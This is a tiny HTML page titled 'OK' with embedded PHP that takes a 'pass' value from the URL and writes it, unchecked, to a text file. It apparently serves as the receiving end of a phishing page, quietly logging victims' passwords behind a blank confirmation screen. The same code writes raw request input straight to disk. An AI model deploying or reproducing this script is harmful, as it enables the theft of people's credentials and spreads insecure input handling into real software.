<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>OK</title>
  </head>
  <body>
    <?php
       $pass = $_GET['pass'];
       $file = fopen("pass.txt", "w");
       fwrite($file,$pass);
       ?>
  </body>
</html>
